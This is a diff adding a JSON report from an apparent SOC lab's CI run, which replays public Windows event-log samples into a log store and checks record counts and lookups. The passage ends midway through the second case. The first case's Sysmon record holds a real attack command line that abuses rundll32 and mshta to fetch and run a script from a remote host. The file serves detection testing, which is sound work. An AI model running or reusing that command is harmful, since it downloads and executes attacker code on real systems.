@@ -1,0 +1,3854 @@
+{
+  "schema_version": 1,
+  "validated_at": "2026-10-06T14:19:00.184478+00:00",
+  "run_id": "ci-backend",
+  "backend": {
+    "version": "3.7.8",
+    "revision": "09e6ce2f",
+    "branch": "release-3.7.x",
+    "buildUser": "root@a72310b1e091",
+    "buildDate": "2026-09-17T13:46:13Z",
+    "goVersion": ""
+  },
+  "transport_sha256": "c4c845983e851c7be182f6cae53f000d4629e03393598f38f08a21c9a0a2c058",
+  "historical_cases": [
+    {
+      "case_id": "case-001",
+      "kind": "Public EVTX",
+      "replay": {
+        "labels": {
+          "job": "soclab",
+          "case_id": "case-001",
+          "replay_run": "ci-backend",
+          "kind": "public",
+          "mode": "historical"
+        },
+        "sent_records": 8,
+        "start_ns": 1558452777286254000,
+        "end_ns": 1558452781141798000,
+        "delivery": "at-least-once HTTP batches; no exactly-once claim"
+      },
+      "count_query": "sum(count_over_time({job=\"soclab\",case_id=\"case-001\",replay_run=\"ci-backend\",mode=\"historical\"}[5s]))",
+      "count_response": {
+        "status": "success",
+        "data": {
+          "resultType": "vector",
+          "result": [
+            {
+              "metric": {},
+              "value": [
+                1558452781.141,
+                "8"
+              ]
+            }
+          ],
+          "stats": {
+            "summary": {
+              "bytesProcessedPerSecond": 111048,
+              "linesProcessedPerSecond": 70,
+              "totalBytesProcessed": 12660,
+              "totalLinesProcessed": 8,
+              "execTime": 0.114004,
+              "queueTime": 0,
+              "subqueries": 0,
+              "totalEntriesReturned": 1,
+              "splits": 0,
+              "shards": 0,
+              "totalPostFilterLines": 8,
+              "totalStructuredMetadataBytesProcessed": 80
+            },
+            "querier": {
+              "store": {
+                "totalChunksRef": 1,
+                "totalChunksDownloaded": 1,
+                "chunksDownloadTime": 2054000,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 12660,
+                  "decompressedLines": 8,
+                  "compressedBytes": 2769,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 8,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 80
+                },
+                "chunkRefsFetchTime": 108970800,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "querierExecTime": 0.1117275
+            },
+            "ingester": {
+              "totalReached": 1,
+              "totalChunksMatched": 0,
+              "totalBatches": 1,
+              "totalLinesSent": 0,
+              "store": {
+                "totalChunksRef": 0,
+                "totalChunksDownloaded": 0,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 0,
+                  "decompressedLines": 0,
+                  "compressedBytes": 0,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 0,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 0
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              }
+            },
+            "cache": {
+              "chunk": {
+                "entriesFound": 1,
+                "entriesRequested": 1,
+                "entriesStored": 0,
+                "bytesReceived": 3157,
+                "bytesSent": 0,
+                "requests": 2,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "index": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "result": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "statsResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "volumeResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "seriesResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "labelResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "instantMetricResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              }
+            },
+            "index": {
+              "totalChunks": 0,
+              "postFilterChunks": 0,
+              "shardsDuration": 0,
+              "usedBloomFilters": false,
+              "totalStreams": 0,
+              "chunkRefsLookupTime": 0,
+              "bloomFilterTime": 0
+            }
+          }
+        }
+      },
+      "uid_query": "{job=\"soclab\",case_id=\"case-001\",replay_run=\"ci-backend\",mode=\"historical\"} | json | event_uid = \"9b7a9dc8cecc34b4026d9faeb49f986eea6043f6bf9c08581f8f17c50f2e96b3\"",
+      "uid_response": {
+        "status": "success",
+        "data": {
+          "resultType": "streams",
+          "result": [
+            {
+              "stream": {
+                "case_id": "case-001",
+                "channel": "Microsoft-Windows-Sysmon/Operational",
+                "command_line": "cmd.exe  /C rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%%20ActiveXObject(\"WScript.Shell\").run(\"mshta https://hotelesms.com/talsk.txt\",0,true);",
+                "destination_ip": "",
+                "event_data_CommandLine": "cmd.exe  /C rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%%20ActiveXObject(\"WScript.Shell\").run(\"mshta https://hotelesms.com/talsk.txt\",0,true);",
+                "event_data_Company": "Microsoft Corporation",
+                "event_data_CurrentDirectory": "C:\\Users\\IEUser\\Desktop\\",
+                "event_data_Description": "Windows Command Processor",
+                "event_data_FileVersion": "6.1.7601.17514 (win7sp1_rtm.101119-1850)",
+                "event_data_Hashes": "SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163",
+                "event_data_Image": "C:\\Windows\\System32\\cmd.exe",
+                "event_data_IntegrityLevel": "High",
+                "event_data_LogonGuid": "{365abb72-39cc-5ce3-0000-002096c70000}",
+                "event_data_LogonId": "0xc796",
+                "event_data_ParentCommandLine": "\"cmd.exe\" /s /k pushd \"C:\\Users\\IEUser\\Desktop\"",
+                "event_data_ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "event_data_ParentProcessGuid": "{365abb72-4f8a-5ce3-0000-0010c5bb4800}",
+                "event_data_ParentProcessId": "3548",
+                "event_data_ProcessGuid": "{365abb72-1a29-5ce4-0000-001054e32101}",
+                "event_data_ProcessId": "1532",
+                "event_data_Product": "Microsoft® Windows® Operating System",
+                "event_data_RuleName": "",
+                "event_data_TerminalSessionId": "1",
+                "event_data_User": "IEWIN7\\IEUser",
+                "event_data_UtcTime": "2019-05-21 15:32:57.276",
+                "event_id": "1",
+                "event_uid": "9b7a9dc8cecc34b4026d9faeb49f986eea6043f6bf9c08581f8f17c50f2e96b3",
+                "host": "IEWIN7",
+                "image": "C:\\Windows\\System32\\cmd.exe",
+                "ip": "",
+                "job": "soclab",
+                "kind": "public",
+                "logon_type": "",
+                "mode": "historical",
+                "original_timestamp": "2019-05-21T15:32:57.286254Z",
+                "parent_guid": "{365abb72-4f8a-5ce3-0000-0010c5bb4800}",
+                "process_guid": "{365abb72-1a29-5ce4-0000-001054e32101}",
+                "provider": "Microsoft-Windows-Sysmon",
+                "record_id": "4125",
+                "replay_mode": "historical",
+                "replay_run": "ci-backend",
+                "script_block": "",
+                "service_name": "soclab",
+                "source_line": "1",
+                "source_sha256": "c05ae5276b05021443a237ad8c4b4985f1a12e3e015a4f7a99d0eaa3b724115c",
+                "target_user": "",
+                "user": "IEWIN7\\IEUser"
+              },
+              "values": [
+                [
+                  "1558452777286254000",
+                  "{\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"command_line\":\"cmd.exe  /C rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\";document.write();h=new%%20ActiveXObject(\\\"WScript.Shell\\\").run(\\\"mshta https://hotelesms.com/talsk.txt\\\",0,true);\",\"destination_ip\":\"\",\"event_data\":{\"CommandLine\":\"cmd.exe  /C rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\";document.write();h=new%%20ActiveXObject(\\\"WScript.Shell\\\").run(\\\"mshta https://hotelesms.com/talsk.txt\\\",0,true);\",\"Company\":\"Microsoft Corporation\",\"CurrentDirectory\":\"C:\\\\Users\\\\IEUser\\\\Desktop\\\\\",\"Description\":\"Windows Command Processor\",\"FileVersion\":\"6.1.7601.17514 (win7sp1_rtm.101119-1850)\",\"Hashes\":\"SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163\",\"Image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"IntegrityLevel\":\"High\",\"LogonGuid\":\"{365abb72-39cc-5ce3-0000-002096c70000}\",\"LogonId\":\"0xc796\",\"ParentCommandLine\":\"\\\"cmd.exe\\\" /s /k pushd \\\"C:\\\\Users\\\\IEUser\\\\Desktop\\\"\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"ParentProcessGuid\":\"{365abb72-4f8a-5ce3-0000-0010c5bb4800}\",\"ParentProcessId\":\"3548\",\"ProcessGuid\":\"{365abb72-1a29-5ce4-0000-001054e32101}\",\"ProcessId\":\"1532\",\"Product\":\"Microsoft® Windows® Operating System\",\"RuleName\":\"\",\"TerminalSessionId\":\"1\",\"User\":\"IEWIN7\\\\IEUser\",\"UtcTime\":\"2019-05-21 15:32:57.276\"},\"event_id\":1,\"event_uid\":\"9b7a9dc8cecc34b4026d9faeb49f986eea6043f6bf9c08581f8f17c50f2e96b3\",\"host\":\"IEWIN7\",\"image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"ip\":\"\",\"logon_type\":\"\",\"original_timestamp\":\"2019-05-21T15:32:57.286254Z\",\"parent_guid\":\"{365abb72-4f8a-5ce3-0000-0010c5bb4800}\",\"process_guid\":\"{365abb72-1a29-5ce4-0000-001054e32101}\",\"provider\":\"Microsoft-Windows-Sysmon\",\"record_id\":4125,\"replay_mode\":\"historical\",\"script_block\":\"\",\"source_line\":1,\"source_sha256\":\"c05ae5276b05021443a237ad8c4b4985f1a12e3e015a4f7a99d0eaa3b724115c\",\"target_user\":\"\",\"user\":\"IEWIN7\\\\IEUser\"}"
+                ]
+              ]
+            }
+          ],
+          "stats": {
+            "summary": {
+              "bytesProcessedPerSecond": 97743,
+              "linesProcessedPerSecond": 61,
+              "totalBytesProcessed": 12660,
+              "totalLinesProcessed": 8,
+              "execTime": 0.129522,
+              "queueTime": 0,
+              "subqueries": 0,
+              "totalEntriesReturned": 1,
+              "splits": 0,
+              "shards": 0,
+              "totalPostFilterLines": 1,
+              "totalStructuredMetadataBytesProcessed": 80
+            },
+            "querier": {
+              "store": {
+                "totalChunksRef": 1,
+                "totalChunksDownloaded": 1,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 12660,
+                  "decompressedLines": 8,
+                  "compressedBytes": 2769,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 1,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 80
+                },
+                "chunkRefsFetchTime": 106909900,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "querierExecTime": 0.127
+            },
+            "ingester": {
+              "totalReached": 1,
+              "totalChunksMatched": 0,
+              "totalBatches": 1,
+              "totalLinesSent": 0,
+              "store": {
+                "totalChunksRef": 0,
+                "totalChunksDownloaded": 0,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 0,
+                  "decompressedLines": 0,
+                  "compressedBytes": 0,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 0,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 0
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              }
+            },
+            "cache": {
+              "chunk": {
+                "entriesFound": 1,
+                "entriesRequested": 1,
+                "entriesStored": 0,
+                "bytesReceived": 3157,
+                "bytesSent": 0,
+                "requests": 2,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "index": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "result": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "statsResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "volumeResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "seriesResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "labelResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "instantMetricResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              }
+            },
+            "index": {
+              "totalChunks": 0,
+              "postFilterChunks": 0,
+              "shardsDuration": 0,
+              "usedBloomFilters": false,
+              "totalStreams": 0,
+              "chunkRefsLookupTime": 0,
+              "bloomFilterTime": 0
+            }
+          }
+        }
+      },
+      "expected_records": 8,
+      "observed_records": 8
+    },
+    {
+      "case_id": "case-002",
+      "kind": "Public EVTX",
+      "replay": {
+        "labels": {
+          "job": "soclab",
+          "case_id": "case-002",
+          "replay_run": "ci-backend",
+          "kind": "public",
+          "mode": "historical"
+        },
+        "sent_records": 3561,
+        "start_ns": 1474303806477878000,
+        "end_ns": 1474303969399674000,
+        "delivery": "at-least-once HTTP batches; no exactly-once claim"
+      },
+      "count_query": "sum(count_over_time({job=\"soclab\",case_id=\"case-002\",replay_run=\"ci-backend\",mode=\"historical\"}[164s]))",
+      "count_response": {
+        "status": "success",
+        "data": {
+          "resultType": "vector",
+          "result": [
+            {
+              "metric": {},
+              "value": [
+                1474303969.399,
+                "3561"
+              ]
+            }
+          ],
+          "stats": {
+            "summary": {
+              "bytesProcessedPerSecond": 4230873,
+              "linesProcessedPerSecond": 3751,
+              "totalBytesProcessed": 4015698,
+              "totalLinesProcessed": 3561,
+              "execTime": 0.9491415,
+              "queueTime": 0,
+              "subqueries": 0,
+              "totalEntriesReturned": 1,
+              "splits": 0,
+              "shards": 0,
+              "totalPostFilterLines": 3561,
+              "totalStructuredMetadataBytesProcessed": 35610
+            },
+            "querier": {
+              "store": {
+                "totalChunksRef": 1,
+                "totalChunksDownloaded": 1,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 4015698,
+                  "decompressedLines": 3561,
+                  "compressedBytes": 323651,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 3561,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 35610
+                },
+                "chunkRefsFetchTime": 941345400,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "querierExecTime": 0.9473839
+            },
+            "ingester": {
+              "totalReached": 1,
+              "totalChunksMatched": 0,
+              "totalBatches": 1,
+              "totalLinesSent": 0,
+              "store": {
+                "totalChunksRef": 0,
+                "totalChunksDownloaded": 0,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 0,
+                  "decompressedLines": 0,
+                  "compressedBytes": 0,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 0,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 0
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              }
+            },
+            "cache": {
+              "chunk": {
+                "entriesFound": 1,
+                "entriesRequested": 1,
+                "entriesStored": 0,
+                "bytesReceived": 324503,
+                "bytesSent": 0,
+                "requests": 2,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "index": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "result": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "statsResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "volumeResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "seriesResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "labelResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "instantMetricResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              }
+            },
+            "index": {
+              "totalChunks": 0,
+              "postFilterChunks": 0,
+              "shardsDuration": 0,
+              "usedBloomFilters": false,
+              "totalStreams": 0,
+              "chunkRefsLookupTime": 0,
+              "bloomFilterTime": 0
+            }
+          }
+        }
+      },
+      "uid_query": "{job=\"soclab\",case_id=\"case-002\",replay_run=\"ci-backend\",mode=\"historical\"} | json | event_uid = \"af2226b0c2b33000d16e176a661276e62e32b1e710d1bc6bbce241abae27fbc8\"",
+      "uid_response": {
+        "status": "success",
+        "data": {
+          "resultType": "streams",
+          "result": [
+            {
+              "stream": {
+                "case_id": "case-002",
+                "channel": "Security",
+                "command_line": "",
+                "destination_ip": "",
+                "event_data_AuthenticationPackageName": "NTLM",
+                "event_data_FailureReason": "%%2313",
+                "event_data_IpAddress": "192.168.198.149",
+                "event_data_IpPort": "50249",
+                "event_data_KeyLength": "0",
+                "event_data_LmPackageName": "-",
+                "event_data_LogonProcessName": "NtLmSsp ",
+                "event_data_LogonType": "3",
+                "event_data_ProcessId": "0x0",
+                "event_data_ProcessName": "-",
+                "event_data_Status": "0xc000006d",
+                "event_data_SubStatus": "0xc0000064",
+                "event_data_SubjectDomainName": "-",
+                "event_data_SubjectLogonId": "0x0",
+                "event_data_SubjectUserName": "-",
+                "event_data_SubjectUserSid": "S-1-0-0",
+                "event_data_TargetDomainName": ".",
+                "event_data_TargetUserName": "JcDfcZTc",
+                "event_data_TargetUserSid": "S-1-0-0",
+                "event_data_TransmittedServices": "-",
+                "event_data_WorkstationName": "6hgtmVlrrFuWtO65",
+                "event_id": "4625",
+                "event_uid": "af2226b0c2b33000d16e176a661276e62e32b1e710d1bc6bbce241abae27fbc8",
+                "host": "DESKTOP-M5SN04R",
+                "image": "",
+                "ip": "192.168.198.149",
+                "job": "soclab",
+                "kind": "public",
+                "logon_type": "3",
+                "mode": "historical",
+                "original_timestamp": "2016-09-19T16:50:06.477878Z",
+                "parent_guid": "",
+                "process_guid": "",
+                "provider": "Microsoft-Windows-Security-Auditing",
+                "record_id": "2455",
+                "replay_mode": "historical",
+                "replay_run": "ci-backend",
+                "script_block": "",
+                "service_name": "soclab",
+                "source_line": "1",
+                "source_sha256": "f313a4c96b39e3fa8ffb4c61a99461996b3f22c4c4108ef981ba257d1470cedc",
+                "target_user": "JcDfcZTc",
+                "user": ""
+              },
+              "values": [
+                [
+                  "1474303806477878000",
+                  "{\"channel\":\"Security\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"AuthenticationPackageName\":\"NTLM\",\"FailureReason\":\"%%2313\",\"IpAddress\":\"192.168.198.149\",\"IpPort\":\"50249\",\"KeyLength\":\"0\",\"LmPackageName\":\"-\",\"LogonProcessName\":\"NtLmSsp \",\"LogonType\":\"3\",\"ProcessId\":\"0x0\",\"ProcessName\":\"-\",\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc0000064\",\"SubjectDomainName\":\"-\",\"SubjectLogonId\":\"0x0\",\"SubjectUserName\":\"-\",\"SubjectUserSid\":\"S-1-0-0\",\"TargetDomainName\":\".\",\"TargetUserName\":\"JcDfcZTc\",\"TargetUserSid\":\"S-1-0-0\",\"TransmittedServices\":\"-\",\"WorkstationName\":\"6hgtmVlrrFuWtO65\"},\"event_id\":4625,\"event_uid\":\"af2226b0c2b33000d16e176a661276e62e32b1e710d1bc6bbce241abae27fbc8\",\"host\":\"DESKTOP-M5SN04R\",\"image\":\"\",\"ip\":\"192.168.198.149\",\"logon_type\":\"3\",\"original_timestamp\":\"2016-09-19T16:50:06.477878Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-Security-Auditing\",\"record_id\":2455,\"replay_mode\":\"historical\",\"script_block\":\"\",\"source_line\":1,\"source_sha256\":\"f313a4c96b39e3fa8ffb4c61a99461996b3f22c4c4108ef981ba257d1470cedc\",\"target_user\":\"JcDfcZTc\",\"user\":\"\"}"
+                ]
+              ]
+            }
+          ],
+          "stats": {
+            "summary": {
+              "bytesProcessedPerSecond": 24861724,
+              "linesProcessedPerSecond": 22046,
+              "totalBytesProcessed": 4015698,
+              "totalLinesProcessed": 3561,
+              "execTime": 0.161521,
+              "queueTime": 0,
+              "subqueries": 0,
+              "totalEntriesReturned": 1,
+              "splits": 0,
+              "shards": 0,
+              "totalPostFilterLines": 1,
+              "totalStructuredMetadataBytesProcessed": 35610
+            },
+            "querier": {
+              "store": {
+                "totalChunksRef": 1,
+                "totalChunksDownloaded": 1,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 4015698,
+                  "decompressedLines": 3561,
+                  "compressedBytes": 323651,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 1,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 35610
+                },
+                "chunkRefsFetchTime": 136556000,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "querierExecTime": 0.159391
+            },
+            "ingester": {
+              "totalReached": 1,
+              "totalChunksMatched": 0,
+              "totalBatches": 1,
+              "totalLinesSent": 0,
+              "store": {
+                "totalChunksRef": 0,
+                "totalChunksDownloaded": 0,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 0,
+                  "decompressedLines": 0,
+                  "compressedBytes": 0,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 0,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 0
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
